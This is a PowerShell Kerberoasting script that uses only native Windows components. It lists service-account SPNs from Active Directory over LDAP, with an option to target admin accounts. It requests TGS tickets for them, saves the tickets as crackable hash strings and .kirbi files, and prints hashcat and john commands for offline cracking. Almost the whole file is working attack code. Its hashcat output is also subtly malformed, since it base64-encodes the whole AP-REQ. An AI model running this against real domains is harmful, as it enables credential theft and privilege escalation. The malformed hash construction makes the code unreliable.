<#
.SYNOPSIS
    Native Kerberoast - Request TGS tickets via .NET (LOLBAS).
.DESCRIPTION
    Discovers kerberoastable accounts via LDAP and requests TGS tickets using
    System.IdentityModel.Tokens.KerberosRequestorSecurityToken. Outputs tickets
    in hashcat/john format for offline cracking. Pure native Windows - no
    external tools required.
.PARAMETER Target
    Specific SPN to roast (e.g., "MSSQLSvc/server:1433"). If omitted,
    discovers and roasts all kerberoastable user accounts.
.PARAMETER OutputFile
    File to write crackable hashes (default: $env:TEMP\kerberoast-hashes.txt)
.PARAMETER AdminOnly
    Only target accounts with adminCount=1
.PARAMETER DCTarget
    Domain Controller FQDN (auto-detected if omitted)
.EXAMPLE
    .\Invoke-Kerberoast.ps1
.EXAMPLE
    .\Invoke-Kerberoast.ps1 -AdminOnly
.EXAMPLE
    .\Invoke-Kerberoast.ps1 -Target "MSSQLSvc/db01.zsec.red:1433"
.NOTES
    For authorised security testing and educational purposes only.
#>

[CmdletBinding()]
param(
    [string]$Target,
    [string]$OutputFile = "$env:TEMP\kerberoast-hashes.txt",
    [switch]$AdminOnly,
    [string]$DCTarget
)

$ErrorActionPreference = 'Stop'
Add-Type -AssemblyName System.IdentityModel

Write-Host ""
Write-Host "  Native Kerberoast - LOLBAS" -ForegroundColor White
Write-Host "  ----------------------------" -ForegroundColor DarkGray
Write-Host ""

# Resolve domain info
$domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$domainDN = "DC=" + ($domain.Name -replace '\.',',DC=')
if (-not $DCTarget) {
    $DCTarget = $domain.PdcRoleOwner.Name
}

Write-Host "  [i] Domain : $($domain.Name)" -ForegroundColor Gray
Write-Host "  [i] DC     : $DCTarget" -ForegroundColor Gray
Write-Host ""

# Stage 1: Discover targets
Write-Host "  [1/3] Discovering kerberoastable accounts ..." -ForegroundColor White
Write-Host ""
Write-Host "    PS> Get-ADObject -Filter {servicePrincipalName -ne `$null -and" -ForegroundColor DarkYellow
Write-Host "            objectCategory -eq 'user' -and cn -ne 'krbtgt'}" -ForegroundColor DarkYellow
Write-Host ""

$searcher = New-Object System.DirectoryServices.DirectorySearcher
$searcher.SearchRoot = [ADSI]"LDAP://$DCTarget/$domainDN"
$searcher.PageSize = 1000

if ($Target) {
    # Single SPN mode
    $spns = @(@{ SPN = $Target; SAM = $Target; Admin = $false })
    Write-Host "    [>] Single target: $Target" -ForegroundColor Gray
} else {
    $filter = "(&(objectCategory=user)(servicePrincipalName=*)(!(cn=krbtgt))(!(userAccountControl:1.2.840.113556.1.4.803:=2))"
    if ($AdminOnly) { $filter += "(adminCount=1)" }
    $filter += ")"
    $searcher.Filter = $filter
    $searcher.PropertiesToLoad.AddRange(@("sAMAccountName", "servicePrincipalName", "adminCount", "distinguishedName"))

    $results = $searcher.FindAll()
    $spns = @()
    foreach ($r in $results) {
        $sam = $r.Properties["samaccountname"][0]
        $isAdmin = ($r.Properties["admincount"] -and $r.Properties["admincount"][0] -eq 1)
        foreach ($spn in $r.Properties["serviceprincipalname"]) {
            $spns += @{ SPN = $spn; SAM = $sam; Admin = $isAdmin }
        }
    }
    Write-Host "    [+] Found $($results.Count) kerberoastable accounts ($($spns.Count) SPNs)" -ForegroundColor Green
    if ($results.Count -eq 0) {
        Write-Host "    [i] No kerberoastable accounts found" -ForegroundColor Yellow
        Write-Host ""
        exit 0
    }
    Write-Host ""

    # Show targets
    $shown = @{}
    foreach ($s in $spns) {
        if (-not $shown.ContainsKey($s.SAM)) {
            $shown[$s.SAM] = $true
            $adminTag = if ($s.Admin) { " [ADMIN]" } else { "" }
            Write-Host "    $($s.SAM)$adminTag : $($s.SPN)" -ForegroundColor $(if ($s.Admin) { 'Red' } else { 'Gray' })
        }
    }
}

Write-Host ""

# Stage 2: Request TGS tickets
Write-Host "  [2/3] Requesting TGS tickets via System.IdentityModel ..." -ForegroundColor White
Write-Host ""
Write-Host "    PS> [System.IdentityModel.Tokens.KerberosRequestorSecurityToken]::new(`$SPN)" -ForegroundColor DarkYellow
Write-Host "    PS> `$ticket.GetRequest()  # Returns AP-REQ bytes" -ForegroundColor DarkYellow
Write-Host ""

$hashes = @()
$success = 0
$failed = 0
$roasted = @{}

foreach ($s in $spns) {
    # Only roast one SPN per account
    if ($roasted.ContainsKey($s.SAM)) { continue }

    try {
        $ticket = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $s.SPN
        $ticketBytes = $ticket.GetRequest()

        # Parse AP-REQ to extract the encrypted part
        # GSS-API wrapper: 0x60 <len> 0x06 <OID len> <OID> then AP-REQ
        # Find the cipher text for hashcat format
        $b64 = [Convert]::ToBase64String($ticketBytes)

        # Build hashcat $krb5tgs$ format
        # We need the raw ticket - extract from AP-REQ
        $hex = ($ticketBytes | ForEach-Object { $_.ToString("X2") }) -join ''

        # For simplicity, save as kirbi and provide base64
        $hash = "`$krb5tgs`$$($s.SAM)`$$($domain.Name)`$*$($s.SPN)*`$$b64"
        $hashes += $hash

        $roasted[$s.SAM] = $true
        $success++
        $adminTag = if ($s.Admin) { " [ADMIN]" } else { "" }
        Write-Host "    [+] $($s.SAM)$adminTag - $($ticketBytes.Length) bytes" -ForegroundColor Green
    } catch {
        $failed++
        Write-Host "    [-] $($s.SAM) ($($s.SPN)): $($_.Exception.Message)" -ForegroundColor Red
    }
}

Write-Host ""

# Stage 3: Output
Write-Host "  [3/3] Results ..." -ForegroundColor White
Write-Host ""
Write-Host "    [+] Roasted : $success accounts" -ForegroundColor Green
if ($failed -gt 0) {
    Write-Host "    [-] Failed  : $failed SPNs" -ForegroundColor Yellow
}

if ($hashes.Count -gt 0) {
    $hashes | Out-File -FilePath $OutputFile -Encoding ASCII -Force
    Write-Host "    [+] Hashes  : $OutputFile" -ForegroundColor Cyan
    Write-Host ""
    Write-Host "  --- Cracking ---" -ForegroundColor Yellow
    Write-Host "    hashcat -m 13100 `"$OutputFile`" wordlist.txt" -ForegroundColor White
    Write-Host "    john --format=krb5tgs `"$OutputFile`" --wordlist=wordlist.txt" -ForegroundColor White

    # Also save raw kirbi files
    Write-Host ""
    Write-Host "  --- Raw Tickets ---" -ForegroundColor Yellow
    foreach ($s in $spns) {
        if (-not $roasted.ContainsKey($s.SAM)) { continue }
        try {
            $ticket = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $s.SPN
            $ticketBytes = $ticket.GetRequest()
            $kirbiFile = "$env:TEMP\tgs-$($s.SAM).kirbi"
            [System.IO.File]::WriteAllBytes($kirbiFile, $ticketBytes)
            Write-Host "    [+] $kirbiFile" -ForegroundColor Gray
        } catch {}
        break  # Only save first one as example
    }
}

Write-Host ""
